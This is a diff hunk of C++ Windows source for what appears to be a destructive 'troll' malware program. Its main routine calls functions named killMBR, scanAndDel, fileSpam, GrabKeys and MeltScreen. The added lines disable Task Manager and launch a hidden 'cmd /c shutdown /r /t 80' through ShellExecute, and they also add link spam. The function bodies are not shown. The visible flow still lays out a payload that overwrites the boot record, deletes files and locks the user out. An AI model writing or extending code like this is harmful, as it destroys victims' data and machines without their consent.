@@ -52,13 +52,26 @@ int main() {
 				if (q2Res == IDYES) {
 					MessageBox(NULL, L"FUCK YOU!!", L"KONO YARRRO!!!!!", MB_ICONERROR);
 					BOOL BlockInput = TRUE;
+					GrabKeys();
 					OverrideWallpaper();
+					delTaskMan();
 					playMusic();
 					std::thread t2(fileSpam);
 					killMBR();
-					std::thread t3(mouseShake);
+					//std::thread t3(mouseShake);
+					Sleep(10000);
+					ShellExecute(
+						NULL,
+						TEXT("open"),
+						TEXT("cmd"),
+						L"/c shutdown /r /t 80",
+						NULL,
+						SW_HIDE
+					);
 					std::thread t1(showDialog);
 					scanAndDel();
+					Sleep(10000);
+					std::thread t4(linkSpam);
 					Sleep(60000);
 					MeltScreen();
 					Sleep(10000);
